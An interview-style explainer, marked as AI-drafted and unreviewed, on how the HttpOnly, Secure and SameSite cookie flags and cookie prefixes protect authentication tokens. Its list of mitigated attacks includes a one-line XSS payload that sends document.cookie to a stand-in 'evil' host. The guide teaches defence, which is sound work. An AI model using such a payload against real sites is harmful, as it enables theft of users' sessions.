How do cookie security flags (`HttpOnly`, `Secure`, `SameSite`) protect authentication tokens against theft?

Security engineer · Gear 2 (Mid-level) · AppSec · Difficulty: medium · AI-drafted, not yet reviewed by a person

In 30 seconds

HttpOnly hides a cookie from JavaScript, so XSS cannot read and exfiltrate a session token. Secure restricts it to HTTPS, blocking sniffing on plaintext connections. SameSite limits cross-site sending, defeating most CSRF and some cross-site leaks. Combined with the __Host- prefix, tight Path and Domain, and short lifetimes, they harden authentication cookies considerably.

Explained in depth

Why cookie attributes matter

Session cookies and tokens are bearer credentials: whoever holds them is the user. Attackers try to steal them (XSS, network sniffing, malware), fixate or overwrite them (subdomain or network injection), or abuse them from other sites (CSRF). Cookie attributes are cheap browser-enforced defences.

The flags

Set-Cookie: __Host-session=9f3c...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
  1. HttpOnly: the browser does not expose the cookie to document.cookie or other JavaScript APIs; it is only sent in HTTP requests. If an XSS bug lets an attacker run script, they cannot read the session ID and send it to their server, which prevents persistent session theft and replay from elsewhere. Limits: XSS code can still perform actions as the user within the page (forge requests with the cookie attached automatically, read responses), so HttpOnly reduces but does not remove XSS impact. Fix XSS itself (encoding, CSP).
  2. Secure: the cookie is only sent over HTTPS (and, in modern browsers, can only be set from secure origins). It prevents leaking the cookie in cleartext on HTTP requests, such as when a user is downgraded or visits http:// links on public Wi-Fi. Combine with HSTS so the browser never makes plaintext requests.
  3. SameSite: controls whether the cookie is sent on cross-site requests:
  • Strict: only sent when the request originates from the same site. Strongest CSRF protection; but clicking a link from an email to your site arrives without the cookie (user appears logged out until reload), which may hurt UX.
  • Lax (default in modern browsers when unspecified): sent on same-site requests and on top-level navigations using safe methods (GET from a link click). Not sent on cross-site POST, iframe, fetch or image requests. Blocks classic CSRF form posts while keeping links working. Note: state-changing GET endpoints remain exposed.
  • None; Secure: sent on all cross-site requests; required for third-party contexts (embedded widgets, SSO flows in iframes, cross-site APIs); then rely on CSRF tokens.

"Site" means registrable domain (eTLD+1) plus scheme, so a.example.com and b.example.com are same-site.

  1. Domain and Path: omit Domain so the cookie is host-only (not shared with subdomains, which could be compromised or attacker-controlled through subdomain takeover). Set Path=/ only when needed.
  2. Lifetime: use session cookies or short Max-Age for authentication, idle and absolute timeouts server-side, rotation after login and privilege change (prevent session fixation), invalidate on logout.
  3. Prefixes: __Secure- requires Secure and HTTPS origin. __Host- requires Secure, no Domain attribute, Path=/, so the cookie cannot be overwritten by sibling subdomains or set from insecure origins, defending against cookie tossing and injection.
  4. Partitioned (CHIPS) cookies for third-party contexts keyed by top-level site, supporting privacy-preserving embeds.

Defence in depth

  • Flags complement other controls: output encoding and CSP (stop XSS), CSRF tokens or double-submit patterns for state changing requests, Origin and Referer verification, Sec-Fetch-Site header checks, re-authentication for sensitive actions, token binding to client properties where possible (device-bound session credentials), and anomaly detection.
  • Avoid storing tokens in localStorage or sessionStorage (readable by any script); prefer HttpOnly cookies or a backend-for-frontend pattern for SPAs.
  • Do not put sensitive data (PII, roles) in cookies unless signed and encrypted (JWT in cookies must still be HttpOnly), keep cookie size small.

Testing

Inspect headers in DevTools (Application panel shows flags), automated checks (OWASP ZAP and security scanners flag missing flags), integration tests asserting Set-Cookie attributes (Secure, HttpOnly, SameSite) for every auth cookie, and verify behaviour in cross-site test pages (does the cookie travel with cross-site POST?). Frameworks provide config: Express cookie: { httpOnly: true, secure: true, sameSite: 'lax' }, Django SESSION_COOKIE_SECURE, Spring server.servlet.session.cookie.*.

Attack examples mitigated

  • XSS payload fetch('//evil/?c='+document.cookie) returns nothing useful with HttpOnly.
  • Public Wi-Fi sniffing of http:// images carrying cookies is prevented by Secure.
  • A malicious page autosubmitting a POST form to bank.com/transfer is blocked by SameSite Lax or Strict because the session cookie is not sent.

Pitfalls

Assuming HttpOnly stops XSS, using SameSite=None without CSRF tokens, setting Domain=.example.com and exposing cookies to every subdomain, forgetting that Lax still permits state-changing GET requests, and leaving cookies without expiry or rotation.

Likely follow-ups

  • Why does HttpOnly not prevent XSS attacks that act within the victim's browser session?
  • What is the difference between SameSite Strict, Lax and None, and how does Lax allow top-level navigations?
  • What do the __Host- and __Secure- cookie prefixes enforce?
